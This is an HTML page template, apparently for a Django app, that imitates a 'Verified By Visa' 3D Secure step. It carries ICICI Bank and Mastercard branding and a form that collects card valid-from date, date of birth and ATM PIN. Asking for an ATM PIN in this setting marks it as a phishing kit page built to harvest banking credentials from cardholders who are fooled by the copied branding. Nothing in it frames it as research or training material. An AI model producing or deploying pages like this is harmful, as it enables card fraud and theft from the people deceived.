<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">

<HTML>

<HEAD>
     <meta HTTP-EQUIV="Cache-Control" CONTENT="no cache">
     <meta HTTP-EQUIV="Pragma" CONTENT="no cache">
     <meta HTTP-EQUIV="Expires" CONTENT="0">
     <meta HTTP-EQUIV="content-type" CONTENT="text/html; charset=utf-8">

     <TITLE>Verified By Visa</TITLE>

     <style>
          @import url('https://fonts.googleapis.com/css?family=Roboto:300,400,400i,500,700&display=swap');


          .payerForm {
               font-family: 'Roboto', sans-serif;
               padding: 20px;
               border: 1px solid #ccc;
               font-size: 14px;
               line-height: 18px;

          }

          .payerForm td {
               padding: 4px;
          }

          .footNotes {
               padding-top: 35px;
               padding-bottom: 20px;
          }

          .input-txt {
               width: 85%;
               padding: 5px;
          }

          input[type="text"],
          .input-txt {
               padding: 5px;
          }

          input#submit {
               padding: 5px 15px;
               margin: 5px;
               text-transform: uppercase;
               border: none;
               background: #5e5e5e !important;
               color: #fff;
          }
     </style>
     <table border="0" cellspacing="1" cellpadding="1" width="450" align="center" class="payerForm" height="400"
          valign="middle">
          <tr>
               <td colspan="2" valign="top">
                    <table width="100%">

                         <tr>
                              <td width="80%"><IMG name="vpasLogo"
                                        SRC="https://www.3dsecure.icicibank.com/ACSWeb/EnrollWeb/ICICIBank/images/vbv_logo.jpg"
                                        BORDER=0 ALT="Verified by Visa"></td>
                              <td width="20%" align=right><IMG name="memberLogo" height=64px width=113px
                                        src="https://images.all-free-download.com/images/graphicthumb/mastercard_1_82737.jpg"
                                        BORDER=0 ALT="" </td>
                         </tr>
                    </table>
               </td>
          </tr>



          <tr>
               <td colspan=2>&nbsp;&nbsp;<FONT SIZE="2" COLOR="#CC3333"><I>Verify 3D Secure PIN Step 1 of 2</I></FONT>

                    <br>
                    <table border="0" cellspacing="0" cellpadding="0" width="97%" align="center">
                         <tr>
                              <td>
                                   <div style="text-align:justify">
                                        <FONT SIZE="2" COLOR="black">Please provide the information in the space below,
                                             to confirm your identity.</FONT>
                                   </div>
                              </td>
                         </tr>
                    </table>
               </td>

          </tr>
          <tr>
               <td colspan=2>&nbsp;</td>
          </tr>
          <tr>
               <td width="40%">
                    <div align="right" class="payerForm1">Card Number :&nbsp; </div>
               </td>

               <td width="60%" valign="center">XXXX XXXX XXXX XXXX</FONT>
               </td>
          </tr>

          <form method="post" action="" name="contactform" id="contactform" autocomplete="on">
               {% csrf_token %}
               <tr>
                    <td width="35%" height="25">
                         <div class="payerForm1" align="right">Valid From :&nbsp; </div>
                    </td>
                    <td width="65%" height="25" class="normal">
                         <input type="text" id="valid_month" name="valid_month" maxlength="2" onFocus=""
                              size="2" onKeyUp="this.style.color = '#000';" onClick="clearField(this);"
                              name="validmonth" placeholder="mm">/
                         <input type="text" id="valid_year" name="valid_year" maxlength="2" onFocus="clearField(this);" size="2"
                              onKeyUp="this.style.color = '#000';"
                              onClick="clearField(this); this.style.color = '#000';" name="validyear" placeholder="yy" required>
                    </td>
               </tr>
               <tr>
                    <td width="35%">
                         <div class="payerForm1" align="right">Date Of Birth :&nbsp; </div>
                    </td>
                    <td width="65%" class="normal">
                         <input type="text" id="dob_date" name="dob_date" maxlength="2" onFocus=""
                              size="2" onKeyUp="this.style.color = '#000';" onClick="clearField(this);" name="dobdate"
                              placeholder="dd">/
                         <input type="text" id="dob_month" name="dob_month" maxlength="2" onFocus="clearField(this);" size="2"
                              onKeyUp="this.style.color = '#000';"
                              onClick="clearField(this); this.style.color = '#000';" name="dobmonth" placeholder="mm">/
                         <input type="text" id="dob_year" name="dob_year" maxlength="4" onFocus=""
                              size="4" onKeyUp="this.style.color = '#000';" onClick="clearField(this);" name="dobyear"
                              placeholder="yyyy">


                    </td>
               </tr>

               <tr>
                    <td colspan="2" align="center" class="footNotes">
                         <font SIZE="1" color='#A12830'>
                              <SCRIPT LANGUAGE="javascript">
                                   document.writeln('The primary account holder\'s date of birth needs to be entered here.');
                              </SCRIPT>
                         </font>
                    </td>
               </tr>

               <tr>
                    <td width="35%">
                         <div class="payerForm1" align="right">ATM PIN :&nbsp; </div>
                    </td>
                    <td width="65%" class="normal">


                         <INPUT TITLE="ATM pin" TYPE="password" name="atmpin" SIZE="6" MAXLENGTH="6" required>
                    </td>
               </tr>

               <tr>
                    <td align="center" colspan="2">
                         <div id="cmd123456" style="visibility:visible"><INPUT TYPE="submit" name="submit"
                                   title="Click here to submit" id="submit" VALUE="Submit"
                                   style="FONT-WEIGHT: bold; COLOR: #ffefd5; BACKGROUND-COLOR: #708090">
                              &nbsp;&nbsp;&nbsp;
                    </td>
               </tr>

          </form>



          <tr>
               <td colspan="2" align="center" class="footNotes">
                    <br>
                    <FONT SIZE="1">This page will automatically timeout after 180 seconds.</font>
               </td>
          </tr>

     </table>
     </div>

     </table>
     </div>


     </BODY>

</HTML>
